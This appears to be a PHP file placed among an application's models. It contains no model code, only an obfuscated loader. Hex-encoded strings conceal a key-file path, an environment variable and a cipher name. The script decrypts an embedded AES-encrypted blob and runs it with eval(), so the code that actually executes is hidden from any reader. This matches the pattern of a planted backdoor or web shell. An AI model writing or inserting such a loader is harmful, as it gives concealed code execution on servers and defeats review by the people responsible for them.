<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('CD0uP7VHhy+D7DBltXQIQQ==');

$c=base64_decode(

'VHhdrb4no+prsio8eN7FKeo8g92uklKYu1r2DCKKrdEkQgxpxQgsu01/cEq3kUUoJ1FpRJFZVN3I' .
'la3TsPphUiupxC+IwFCVEang6dSUc4GlZ8j0E1i67H4pHV/twFqVwnaCfMIU12wpdJpVwd8/zUa2' .
'uKkwbhP4krQPQSlQjPdQsOJ5mHUViHgIUjj2KsABF9eOiuyY1LqOXLYiTBh6EByClRknF25EaXBd' .
'XyTDwgfBsj6eqYcB7K4MVaxKlcVblmrkPqqaYZYeq76Y8kFG4UZjv9RJn52LBjRe05SIzubE6fQq' .
'OCXQVKKwbSxwB0ktpamyA9HAqL7jJ0h7Q2NlTXACDFL6sXbO5RAxq0Hiz+0AshPNJJ9ruEHCuRoG' .
'I6MCooVHAtcJcNsy5hcDQNpGT/tlFjldkP/0LBOf+rTK9RSYSvo+4CQJYsxeqyqLiqrtUe1erEgl' .
'tC49zchNx0cFayXfKc5JUo/GwsMzuAJOTzBXYkedza0GOkV2Utn1lPngWpgD7xfakFA6w9QG8vPW' .
'GQDV8xhOz2pBrqE33mQ71Nfe7b4h2J8K0wNbDMJNahx39K16Ymt1Idz1ieobUIqKO47yGWEOEpel' .
'rw6m8u2g9dYpITE8FWz8I9kUjIDd1jp67qrdEAGZOYZNSQU4kmPVs3b75q4LstGTDGmknQkPtie5' .
'CkAeFQelFnvlhUupJHQw7m2M6fNwYQi4bumZ3QWS4TV/KFgF8lke/+bxvB+4yEH6yzRPYYUOMTqL' .
'jTVi3EQgNMazgtaTcpc4y6YGdffRB+GuSyBfwIIz1uZ4YJKNaH+m5FTHcGIttBWkonjWn5F8sNga' .
'ABwLzPoCTFftKJahtT1VVkrhRGrFKTiViKSb2oWEMw8oiYMPJp+mOlwXOeNy'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

